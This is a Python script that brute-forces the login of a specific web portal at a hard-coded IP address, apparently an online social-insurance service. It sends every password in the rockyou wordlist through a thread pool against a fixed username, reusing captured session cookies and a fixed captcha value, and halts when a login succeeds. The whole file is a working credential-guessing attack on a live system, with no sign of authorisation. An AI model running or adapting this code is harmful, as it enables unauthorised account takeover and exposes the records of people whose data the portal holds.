import requests
import os
from multiprocessing.dummy import Pool as ThreadPool
import thread
import re

pool = ThreadPool(10)
paused = False
url = "http://222.82.215.217:9999/xjwssb/j_spring_security_check?r=2534"
headers = {
	"Host": "222.82.215.217:9999",
	"User-Agent": "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
	"Accept": "application/json, text/javascript, */*; q=0.01",
	"Accept-Language": "en-US,en;q=0.5",
	"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
	"X-Requested-With": "XMLHttpRequest",
	"Referer": "http://222.82.215.217:9999/xjwssb/login.jsp",
	"Content-Length": "71",
	"Cookie": "j_username=2550049; POSTID=0.5451241189658221; JSESSIONID=sqNCYrYPtXbxdYmJh3y2nQFytPL1jsgDnnlZCl9r1FFGC2gLCnnT!-1948468533; BIGipServerWangShangSheBao_Pool=2370095626.24347.0000; UM_distinctid=15b494e8d0a9-04e2d37cdb5db6-7024225e-232800-15b494e8d0b13f; CNZZDATA5500689=cnzz_eid%3D1364643688-1491808068-%26ntime%3D1491808068; basepath=%2F; servicepath=%2Fplatform%2F",
	"Connection": "close",
}

headers1 = {
	"Host": "222.82.215.217:9999",
	"User-Agent": "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
	"Accept": "application/json, text/javascript, */*; q=0.01",
	"Accept-Language": "en-US,en;q=0.5",
	"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
	"X-Requested-With": "XMLHttpRequest",
	"Referer": "http://222.82.215.217:9999/xjwssb/login.jsp",
	"Cookie":"j_username=2550049; POSTID=0.5451241189658221; JSESSIONID=sqNCYrYPtXbxdYmJh3y2nQFytPL1jsgDnnlZCl9r1FFGC2gLCnnT!-1948468533; BIGipServerWangShangSheBao_Pool=2370095626.24347.0000; UM_distinctid=15b494e8d0a9-04e2d37cdb5db6-7024225e-232800-15b494e8d0b13f; CNZZDATA5500689=cnzz_eid%3D1364643688-1491808068-%26ntime%3D1491808068; basepath=%2F; servicepath=%2Fplatform%2F",
	"Connection": "close",
}


data = {"j_username":"2550049",
	"j_password":"",
	"orgId":"",
	"checkCode":"hxpfd",
	"tm":"14915789732260"}
class Bruteforcer:
	def getpassword(self, path):
			if os.path.exists(path):
					with open(path, 'r') as f:
							for line in f:
									yield line.rstrip()

#'/usr/share/wordlists/rockyou.txt'
	def brute_pass(self, password):
		data['j_password'] = password
		r = requests.post(url,headers=headers,data=data, allow_redirects=False)
		#print r.content
		
#print r.content
		if "loginFailureAction.do" in r.content:
			result = re.findall(r'<a href="(.*?)">',r.content)
			#print result
			r1=requests.get(result[0],headers=headers1)
			print r1.content, "password", password
		else:
			global paused
			paused = True
			print "password",password,"success"

	def deploy(self):
		
		#pool = ThreadPool(10)
		#print self.get_root_url(end=100)
		monitor = Monitor()

		thread.start_new_thread(monitor.test_paused,())
		pool.map(self.brute_pass, self.getpassword('/usr/share/wordlists/rockyou.txt'))
		pool.join()
		pool.close()
class Monitor:
	def test_paused(self):
		global paused
		while True:
			if paused:
				pool.terminate()
if __name__=='__main__':

	Bruteforcer().deploy()
	#data['j_password'] = '1'
		#r = requests.post(url,headers=headers,data=data, allow_redirects=False)

